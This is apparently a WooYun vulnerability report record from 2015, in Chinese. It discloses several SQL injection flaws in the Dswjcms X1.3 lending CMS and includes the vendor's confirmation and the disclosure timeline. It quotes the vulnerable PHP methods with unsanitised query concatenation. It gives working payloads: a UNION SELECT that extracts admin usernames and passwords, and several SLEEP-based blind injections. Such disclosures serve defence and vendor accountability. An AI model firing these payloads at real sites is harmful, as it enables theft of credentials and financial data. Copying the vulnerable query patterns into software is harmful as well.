{"id": 84676, "wybug_id": "wooyun-2015-0143727", "wybug_title": "Dswjcms! X1.3 sql注入n多处#2(需要登录会员)", "wybug_corp": "dswjcms.com", "wybug_author": "不能忍", "wybug_date": "2015-09-29 16:28", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-07：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 很多sql注入在这里了，我就不刷了，打包了！ 详细说明：  漏洞文件:/Lib/Action/Home/CenterAction.class.php      \npublic function invest(){\t\t$this->homeVerify();\t\t$refund=M('collection');\t\t$automatic=D('Automatic');\t\t$this->assign('mid',$this->_get('mid'));\t\t$isbid=$this->bidRecords(3,0,$this->_session('user_uid'));\t\t\t$this->assign('isbid',$isbid);\t\t$isclosed=$this->bidRecords(7,0,$this->_session('user_uid'),1);\t\t$win=$this->bidRecords(9,0,$this->_session('user_uid'),1);\t\t$this->assign('win',$win);\t\t$overdue=$this->overdue($this->_session('user_uid'));//逾期信息\t\t$this->assign('overdue',$overdue);\t\t$uncollected=$this->bidRecords(11,0,$this->_session('user_uid'),1);\t\t$this->assign('isclosed',$isclosed);\t\t\t\tif($this->_get('bid') && $this->_get('mid')=='plan'){\t//还款计划\t\t\t\t$refun=$refund->where('bid='.$this->_get('bid').' and uid='.$this->_session('user_uid'))->order('time ASC')->select(); //mark\t\t\t$this->assign('refun',$refun);\t\t}\nhttp://localhost/Center/invest/?mid=plan&bid=1) UNION SELECT 1,concat(username,0x2c,password),3,4,5,6,7,8 from ds_admin%23\npublic function loan(){\t\t$this->homeVerify();\t\t$this->assign('mid',$this->_get('mid'));\t\t$list=$this->borrowUidUnicom($this->_session('user_uid'));\t\t$refund=M('refund');\t\tif($this->_get('bid') && $this->_get('mid')=='plan'){\t//还款计划\t\t\t$refun=$refund->where('bid='.$this->_get('bid'))->order('time ASC')->select();\t\t\t$borrowing=M('borrowing');\t\t\t$borrow=$borrowing->field('money')->where('`id`='.$this->_get('bid'))->find();//mark\t\t\t$interest=$this->interest($this->_session('user_uid'),$borrow['money']);\t\t\t$this->assign('interest',$interest);\t\t\t$this->assign('refun',$refun);\t\t}\t\tif($this->_get('bid') && $this->_get('mid')=='flowplan'){\t//流转标的还款计划\t\t\tif($this->_get('nper')>0){//如果有nper说明是流转标，流转标只显示对应期数\t\t\t\t$refun=$refund->where('bid='.$this->_get('bid').' and uid='.$this->_session('user_uid'))->order('time ASC')->select();  //mark\t\t\t}else{\t\t\t\t$refun=$refund->where('bid='.$this->_get('bid').' and uid='.$this->_session('user_uid'))->order('time ASC')->select();   //mark\t\t\t}\t\t\t$borrowing=M('borrowing');\t\t\t$borrow=$borrowing->field('money')->where('`id`='.$this->_get('bid'))->find();//mark\t\t\t$interest=$this->interest($this->_session('user_uid'),$borrow['money']);\t\t\t$this->assign('interest',$interest);\t\t\t$this->assign('refun',$refun);\t\t}\t\t$this->assign('list',$list);\t\t$overdue=$this->verdue($this->_session('user_uid'));//逾期信息\t\t$this->assign('overd',$overdue);\t\t$active['center']='active';\t\t$this->assign('active',$active);\t\t$isflo=$this->bidRecords(16,0,$this->_session('user_uid'));\t\tif($isflo){\t//筛选需要显示并不重复的正在流转的标\t\t\tforeach($isflo as $id=>$is){\t\t\t\t$bid=$is['actionname']['bid'];\t\t\t\tif(in_array($bid,$ar)){\t//流转标相同的信息只显示一次\t\t\t\t}else{\t\t\t\t\t$ar[]=$bid;\t\t\t\t\tif(!empty($arr[$bid])){\t\t\t\t\t\t$imd=$arr[$bid]+1;\t\t\t\t\t}else{\t\t\t\t\t\t$imd=1;\t\t\t\t\t}\t\t\t\t\t\t\t\t$arr[$bid]++;\t\t\t\t\t$count=$refund->field('time')->where(' bid='.$bid.' and uid='.$this->_session('user_uid').' and type=0')->find();//mark\t\t\t\t\tif($count>0){\t\t\t\t\t\t$isflow[$id]['bid']=$bid;\t\t\t\t\t\t$isflow[$id]['id']=$imd;\t\t\t\t\t\t$isflow[$id]['title']=$is['details']['title'];\t\t\t\t\t\t$isflow[$id]['rates']=$is['details']['rates'];\t\t\t\t\t\t$isflow[$id]['code']=$is['details']['code'];\t\t\t\t\t\t$isflow[$id]['type_name']=$is['details']['type_name'];\t\t\t\t\t\t$isflow[$id]['operation']=$is['actionname']['operation'];\t\t\t\t\t\t$isflow[$id]['deadline']=$is['actionname']['deadline'];\t\t\t\t\t\t$isflow[$id]['time']=$count['time'];\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t\tunset($count);\t\tunset($arr);\t\tunset($isflo);\t\t\t$this->assign('isflow',$isflow);\t\t$this->display();    }\n这里还有一处sql盲注:\tpublic function borrows($id){\t\t$borrowing = M(\"borrowing\");\t\treturn $borrowing->where('id='.$id)->field('id,title,rates,deadline,money,state')->find();\t}payload:http://localhost/Center/borrows/?id=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23\n\n再来一处sql盲注:\npublic function emailVerify(){\t\t$this->homeVerify();\t\t$userinfo=M('user');\t\t$smtp=M('smtp');\t\t$stmpArr=$smtp->find();\t\t$getfield = $userinfo->where(\"`id`=\".$this->_session('user_uid').\" and `email`='\".$this->_post('email').\"'\")->find();   //mark\npayload:http://localhost/Center/emailVerify/post:email=test') AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23再来一处sql盲注：\npublic function stationexit(){\t\t$this->homeVerify();\t\t$msgTools = A('msg','Event');\t\t$instation=M('instation');\t\t$result=$instation->where('id='.$this->_get('id'))->delete();//mark\t\tif($result){\t\t\t $this->success(\"删除成功\");\t\t\t\t\t\t}else{\t\t\t$this->error(\"删除失败\");\t\t}\t\t\t     }\npayload:http://localhost/Center/stationexit/test) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'--\npublic function agreement(){\t\t$this->homeVerify();\t\tif(!$this->_get('bid')){\t\t\t$this->error(\"操作有误！\");\t\t}\t\t$refund=M('refund');\t\t$collection=M('collection');\t\t$re=$refund->where('uid='.$this->_session('user_uid').' and bid='.$this->_get('bid'))->find();//mark\t\t$co=$collection->where('uid='.$this->_session('user_uid').' and bid='.$this->_get('bid'))->find();\t\tif($re || $co){\t\t\t$boow=reset($this->borrow_unicom($this->_get('bid')));//mark\t\t\t$userinfo=D('Userinfo');\t\t\t$userin=$userinfo->field('name,idcard,uid')->relation(true)->where('uid='.$boow['uid'])->find();\t\t\tif($boow['type']==8){\t//机构担保标\t\t\t$bid_record=$this->lendUser('7',$this->_get('bid'));\t\t\t$Guarantee = D(\"Guarantee\");\t\t\t$gcompany=$Guarantee->field('gid')->relation(true)->where('bid='.$this->_get('bid'))->find();//mark\n最后两处sql注入：\tpublic function alipayreturn(){\t\t$msgTools = A('msg','Event');\t\theader(\"Content-Type:text/html; charset=utf-8\");\t\tvendor('Alipay.Notify');\t\t$online=M('online');\t\t$list=$online->where('`id`=1')->find();\t\t$alipay_config['partner']\t\t= $list['pid'];\t\t$alipay_config['key']\t\t\t= $list['checking'];\t\t$alipay_config['sign_type']    = strtoupper('MD5');//签名方式 不需修改\t\t$alipay_config['input_charset']= strtolower('utf-8');//字符编码格式 目前支持 gbk 或 utf-8\t\t$alipay_config['transport']    = 'http';//访问模式,根据自己的服务器是否支持ssl访问，若支持请选择https；若不支持请选择http\t\t$alipayNotify = new AlipayNotify($alipay_config);\t\t$verify_result = $alipayNotify->verifyReturn();\t\t//获取充值\t\t$recharge=M('recharge');\t\t$rechar=$recharge->where('nid='.$this->_get('out_trade_no'))->find();\t\tif($verify_result) {//验证成功   //mark\t\t\t$recharge->where('nid='.$this->_get('out_trade_no'))->save(array('type'=>2,'audittime'=>time(),'date'=>json_encode($_GET),'handlers'=>'第三方支付'));  //mark这里应该是有两处sql盲注的，一处是select的，一处是update的http://localhost/Center/alipayreturn/?out_trade_no=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'--   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-04 10:18 厂商回复： 漏洞已找到解决方案，正在着手解决中，感谢作者，所有解决方案都会在官方论坛进行公布修复方案和在下一版本中给予修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}